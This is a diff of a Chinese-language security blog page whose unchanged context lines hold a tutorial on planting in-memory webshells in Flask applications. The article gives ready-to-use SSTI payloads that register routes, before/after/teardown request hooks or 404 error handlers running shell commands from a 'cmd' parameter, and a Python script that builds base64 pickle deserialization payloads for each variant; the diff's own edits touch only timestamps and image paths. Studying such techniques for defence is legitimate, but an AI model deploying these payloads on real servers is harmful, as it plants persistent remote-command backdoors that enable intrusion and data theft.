@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/favicon.ico">
 <meta property="article:published_time" content="2024-05-14T11:51:52.000Z">
-<meta property="article:modified_time" content="2024-05-17T07:45:00.627Z">
+<meta property="article:modified_time" content="2024-05-17T12:00:24.892Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1715931900627"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1715947224892"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -217,7 +217,7 @@
 <p>但是其本质都是通过<strong>动态注册 Servlet或者filter及其映射路由，以及动态注册listener</strong>进行攻击的</p>
 <p>因此<strong>能否动态注册</strong>便成为了我们能否打内存马的关键，回到flask，我们不管是出题还是写开发要利用到flask框架的大概都知道，写一个路由的时候都需要用<code>@app.route('xxx')</code>，这是flask常规注册路由的方式</p>
 <p>而实际工作的函数为该装饰器里调用的方法：<code>self.add_url_rule()</code>，如图：</p>
-<img src="/posts/undefined/1.png" class title="awa">
+<img src="/posts/4656/1.png" class title="awa">
 <p>通过上面的图还可以得到<code>add_url_rule</code>具有三个参数：</p>
 <ul>
 <li>url，和app.route的第一个参数一样，必须以<code>/</code>开始</li>
@@ -247,13 +247,13 @@
 <p>简单整一个ssti，但是此处模拟<code>无回显+不出网</code>的效果：</p>
 <p>如果url_for没有current_app，可以换成<code>get_flashed_messages</code>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:__import(&#x27;os&#x27;).popen(_request_ctx.stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/2.png" class title="awa">
+<img src="/posts/4656/2.png" class title="awa">
 <p>此处将源码修改为无回显情况：</p>
-<img src="/posts/undefined/3.png" class title="awa">
+<img src="/posts/4656/3.png" class title="awa">
 <p>测试我们的内存马：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:get_flashed_messages.__globals__[%27current_app%27]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>flask高版本下是不行了？还是我姿势不对。。。</p>
-<img src="/posts/undefined/4.png" class title="awa">
+<img src="/posts/4656/4.png" class title="awa">
 <p>晕，不纠结了，也不太重要，payload放这里</p>
 <p>哦对了，要记住，这里是通过<code>render_template_string</code>才能触发的哦</p>
 <h1><span id="bypass"> bypass</span></h1>
@@ -274,18 +274,18 @@
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yoyoketang/p/16673124.html">Flask 学习-67.钩子函数</a></p>
 <h2><span id="appbefore_request"> @app.before_request</span></h2>
 <p>官方文档里，<code>@app.before_request</code>的作用就是注册一个在每次请求之前先运行的函数</p>
-<img src="/posts/undefined/6.png" class title="awa">
+<img src="/posts/4656/6.png" class title="awa">
 <p>往下看它的实现，是<code>before_request_funcs</code></p>
-<img src="/posts/undefined/7.png" class title="awa">
+<img src="/posts/4656/7.png" class title="awa">
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">before_request</span>(<span class="params">self, f</span>):</span><br><span class="line">     self.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">     <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure>
 <p>那照猫画虎一下，其实就是利用<code>app.before_request_funcs.setdefault(None, []).append(f)</code>，本质是注册一个函数，所以f就是我们利用的<code>lambda</code>匿名函数</p>
 <p>那就可以手搓一个payload如下(ssti)：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p><s>为什么用get_flashed_messages已经在上面说过了，是因为我的url_for没有current_app</s></p>
 <p>测试环境：</p>
-<img src="/posts/undefined/8.png" class title="awa">
+<img src="/posts/4656/8.png" class title="awa">
 <p>可以看到内存马已经生效了：</p>
-<img src="/posts/undefined/9.png" class title="awa">
+<img src="/posts/4656/9.png" class title="awa">
 <p>如果不想这么麻烦的话，其实app等效于：<code>__import__('sys').modules['__main__'].__dict__['app']</code>，request可以直接写命令，例如：</p>
 <p>如果没有直接的ssti点就可以用这个payload打</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;)</span><br></pre></td></tr></table></figure>
@@ -294,11 +294,11 @@
 <h2><span id="appafter_request"> @app.after_request</span></h2>
 <p>before_request的好兄弟after_request，顾名思义他是在请求之后生效的</p>
 <p>同样翻文档找一下它的实现函数，如果没猜错的话应该是<code>after_request_funcs</code>：</p>
-<img src="/posts/undefined/10.png" class title="awa">
+<img src="/posts/4656/10.png" class title="awa">
 <p>还真是</p>
 <p>再找一下它是怎么写这个函数的：</p>
 <span class="blur">网图找不到了只能自己翻vscode找flask的源码了</span>
-<img src="/posts/undefined/11.png" class title="awa">
+<img src="/posts/4656/11.png" class title="awa">
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">after_app_request</span>(<span class="params">self, f: T_after_request</span>) -&gt; T_after_request:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Like :meth:`after_request`, but after every request, not only those handled</span></span><br><span class="line"><span class="string">        by the blueprint. Equivalent to :meth:`.Flask.after_request`.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.record_once(</span><br><span class="line">            <span class="keyword">lambda</span> s: s.app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure>
 <p>利用<code>s.app.after_request_funcs.setdefault(None, []).append(f)</code>打，但是这里有一些限制就是。after_app_request需要返回一个response对象，这就是这个函数比较难接受的地方</p>
 <p>我们还需要通过<code>make_response</code>重新生成一个response，带着我们rce后的结果返回</p>
@@ -308,8 +308,8 @@
 <p>写成ssti</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>属实不怎么好看。。。但是能用</p>
-<img src="/posts/undefined/12.png" class title="awa">
-<img src="/posts/undefined/13.png" class title="awa">
+<img src="/posts/4656/12.png" class title="awa">
+<img src="/posts/4656/13.png" class title="awa">
 <span class="blur">不推荐使用该方式写内存马()</span>
 <h2><span id="appteardown_request"> @app.teardown_request</span></h2>
 <p>teardown_request是在每次请求后，即使遇到了异常情况，都会绑定一个函数。如果有相关异常信息抛出，<strong>它会接受异常信息</strong></p>
@@ -318,8 +318,8 @@
 <p>直接写payload了，注意这个函数会接受异常信息，所以要加个参数：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.teardown_request_funcs.setdefault(None, []).append(lambda error:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;, &#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>可惜它是无回显的，只能够通过写文件测试效果：</p>
-<img src="/posts/undefined/14.png" class title="awa">
-<img src="/posts/undefined/15.png" class title="awa">
+<img src="/posts/4656/14.png" class title="awa">
+<img src="/posts/4656/15.png" class title="awa">
 <p>严格意义上这个已经不能被称为内存马了，故不太推荐，只有在允许写的情况下才能拿到结果</p>
 <h2><span id="error_handler"> error_handler</span></h2>
 <p>另一个能够处理错误的就是error_handler。flask给出的实例是通过该方法自定义404页面和500页面：</p>
@@ -335,8 +335,8 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;global exc_class;global code;exc_class,code=app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda error:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;qwq&#x27;)).read()&quot;)</span><br></pre></td></tr></table></figure>
 <p>ssti版本，大同小异：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&quot;global exc_class;global code;exc_class,code=app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda error:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;qwq&#x27;)).read()&quot;, &#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/17.png" class title="awa">
-<img src="/posts/undefined/18.png" class title="awa">
+<img src="/posts/4656/17.png" class title="awa">
+<img src="/posts/4656/18.png" class title="awa">
 <p>这里对error_handler的理解比较浅显，大致可以理解成flask利用error_handler处理异常时利用上面所说的几个函数注册了自定义异常页面，然后我们就可以通过这几个函数覆盖错误页面的函数f，导致访问404页面的时候造成rce，详细的追踪过程可以去看gxngxngxn师傅的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18181936.html">这篇文章</a></p>
 <h1><span id="ssti_version"> ssti_version</span></h1>
 <p>小总结</p>
@@ -355,7 +355,7 @@
 <p>上文说过app可以通过<code>__import__('sys').modules['__main__'].__dict__['app']</code>来拿</p>
 <p>这里request也不一定要在全局定义，所以我们只需要处理app的问题即可：</p>
 <p>简单写个pickle路由处理</p>
-<img src="/posts/undefined/19.png" class title="awa">
+<img src="/posts/4656/19.png" class title="awa">
 <p>写个大杂烩：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">old_version</span>(): <span class="comment">#少用，基本上没有能够用到的地方了 The setup method &#x27;add_url_rule&#x27; can no longer be called on the application.</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:__import(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>():</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;</span>,))</span><br><span class="line">    <span class="keyword">return</span> pickle.dumps(A())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after_request</span>():</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line">    <span class="keyword">return</span> pickle.dumps(A())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">teardown_request_normal</span>():</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;</span>,))</span><br><span class="line">    <span class="keyword">return</span> pickle.dumps(A())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">teardown_request_b64</span>(): <span class="comment">#payload需要通过base64加密再放进去</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error:__import__(&#x27;os&#x27;).system(base64.b64decode(request.args.get(&#x27;cmd&#x27;)).decode()))&quot;</span>,))</span><br><span class="line">    <span class="keyword">return</span> pickle.dumps(A())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error_handler</span>():</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">exec</span>, (<span class="string">&quot;global exc_class;global code;exc_class,code=app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda error:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>,))</span><br><span class="line">    <span class="keyword">return</span> pickle.dumps(A())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64_encode(error_handler()))</span><br></pre></td></tr></table></figure>
 <p>测试截图就不放了，都能打，除了<code>teardown</code>是无回显的要自己测以外</p>
@@ -456,7 +456,7 @@
                     <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-05-17T07:45:00.627Z" itemprop="dateModified">最后编辑：2024-05-17</time>
+                    <time datetime="2024-05-17T12:00:24.892Z" itemprop="dateModified">最后编辑：2024-05-17</time>
                 </div>
             </div>
         </footer>
